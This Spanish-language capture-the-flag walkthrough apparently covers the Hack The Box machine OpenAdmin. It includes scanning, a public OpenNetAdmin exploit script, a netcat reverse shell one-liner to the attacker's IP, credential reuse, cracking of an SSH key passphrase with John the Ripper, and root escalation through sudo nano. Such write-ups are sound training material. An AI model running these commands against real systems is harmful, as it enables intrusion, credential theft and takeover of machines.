---
description: '✍️ Autor: MrR3boot 🔍 Dificultad: Fácil 📅 Fecha de creación: 16/04/2020'
---

# OpenAdmin

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.171
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1309).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.171
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1310).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 22 (SSH):** El puerto 22 está abierto y ejecutando OpenSSH 7.6p1 en un sistema Ubuntu Linux. Se han detectado las claves del host en los algoritmos RSA, ECDSA y ED25519, lo que indica que el sistema permite conexiones seguras mediante SSH.
* **Puerto 80 (HTTP):** El puerto 80 está abierto y ejecutando un servidor web Apache 2.4.29 en Ubuntu. La página detectada es la predeterminada de Apache en Ubuntu, lo que sugiere que el servidor web podría estar recién configurado o sin contenido adicional.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 10.10.10.171
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1311).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (1312).png" alt=""><figcaption></figcaption></figure>

No vemos nada así a primera vista ni tampoco en el código fuente por lo que vamos a escanear directorios.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.10.171/FUZZ
```

<figure><img src="../../.gitbook/assets/image (1313).png" alt=""><figcaption></figcaption></figure>

Entramos en el directorio `/music`.

<figure><img src="../../.gitbook/assets/image (1314).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un panel de Login.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-23 160359.png" alt=""><figcaption></figcaption></figure>

Parece un controlador de dominios por lo que lo añado.

```
echo "10.10.10.171 openadmin.htb" >> /etc/hosts
```

Vemos que se nos muestra una versión por lo que miramos si hay alguna versión.

```
searchsploit opennetadmin
```

<figure><img src="../../.gitbook/assets/image (1315).png" alt=""><figcaption></figcaption></figure>

Nos lo descargamos.

```bash
searchsploit -m php/webapps/47691.sh
```

<figure><img src="../../.gitbook/assets/image (1316).png" alt=""><figcaption></figcaption></figure>

Ejecutamos.

```bash
./47691.sh http://10.10.10.171/ona/
```

<figure><img src="../../.gitbook/assets/image (1317).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Nos mandamos una Reverse Shell.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.43 443 >/tmp/f
```

<figure><img src="../../.gitbook/assets/image (1318).png" alt=""><figcaption></figcaption></figure>

En la ruta `/opt/ona/www/local/config`.

<figure><img src="../../.gitbook/assets/image (1319).png" alt=""><figcaption></figcaption></figure>

Encontramos unas credenciales. Es habitual que los usuarios reutilicen contraseñas así que nos logueamos con esas.

```bash
ssh jimmy@10.10.10.171
```

<figure><img src="../../.gitbook/assets/image (1320).png" alt=""><figcaption></figcaption></figure>

En la ruta `/var/www/internal` encontramos archivos interesantes.

<figure><img src="../../.gitbook/assets/image (1321).png" alt=""><figcaption></figcaption></figure>

Vemos que interactúa con el **main.php**.

<figure><img src="../../.gitbook/assets/image (1322).png" alt=""><figcaption></figcaption></figure>

Parece que el archivo `main.php` está ejecutando un comando del sistema, y cada vez que se ejecuta, muestra la clave privada (`id_rsa`) de Joanna (otro usuario).

El archivo no era accesible desde el exterior, lo que indica que probablemente esté alojado de forma interna. Por ello, decidí revisar los puertos que estaban en escucha.

```bash
netstat -l
```

<figure><img src="../../.gitbook/assets/image (1323).png" alt=""><figcaption></figcaption></figure>

```bash
curl http://127.0.0.1:52846/main.php
```

<figure><img src="../../.gitbook/assets/image (1324).png" alt=""><figcaption></figcaption></figure>

Nos lo copiamos y le damos permisos.

```
chmod 600 id_rsa
```

Usamos John The Ripper para sacar la contraseña de la clave cifrada.

```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="../../.gitbook/assets/image (1325).png" alt=""><figcaption></figcaption></figure>

Iniciamos sesión con Joana.

```bash
ssh -i id_rsa joanna@10.10.10.171
```

<figure><img src="../../.gitbook/assets/image (1326).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.&#x20;

<figure><img src="../../.gitbook/assets/image (1327).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/nano/" %}

```bash
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```

<figure><img src="../../.gitbook/assets/image (1328).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (1329).png" alt=""><figcaption></figcaption></figure>
